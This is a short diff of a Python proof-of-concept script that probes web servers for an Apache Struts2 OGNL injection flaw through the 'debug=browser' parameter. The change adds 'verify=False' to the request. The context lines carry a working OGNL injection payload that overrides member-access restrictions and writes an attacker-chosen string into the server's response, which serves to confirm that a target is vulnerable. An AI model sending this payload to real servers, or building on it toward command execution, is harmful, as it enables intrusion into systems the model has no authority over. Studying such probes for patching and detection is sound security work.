@@ -29,7 +29,7 @@ def poc(url):
     payload = "?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=" + key
     target = (url + payload)
     try:
-        c = requests.get(target, headers={'User-Agent': firefox()}, timeout=5).content
+        c = requests.get(target, headers={'User-Agent': firefox()}, timeout=5, verify=False).content
         if key in c and 'xwork2.dispatcher' not in c:
             return url
     except Exception, e:
